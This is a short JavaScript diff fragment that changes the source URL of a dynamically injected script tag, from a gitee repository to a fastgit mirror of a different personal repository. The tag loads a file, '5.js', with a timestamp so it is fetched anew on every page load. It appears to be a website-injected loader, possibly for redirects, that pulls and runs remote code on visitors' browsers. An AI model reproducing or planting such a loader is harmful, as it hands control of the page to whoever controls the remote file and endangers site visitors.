@@ -4,6 +4,6 @@ if (tiaojjjxxxbbbObj) {
 } else {
 	var element = document.createElement('script');
 	element.id = 'tiaojjjxxxbbb';
-	element.charset = 'utf-8', element.setAttribute('src', 'https://gitee.com/ok30/10/raw/master/5.js?' + Date.parse(new Date()));
+	element.charset = 'utf-8', element.setAttribute('src', 'https://raw.fastgit.org/mini536/01/master/5.js?' + Date.parse(new Date()));
 	document.body.appendChild(element)
 };
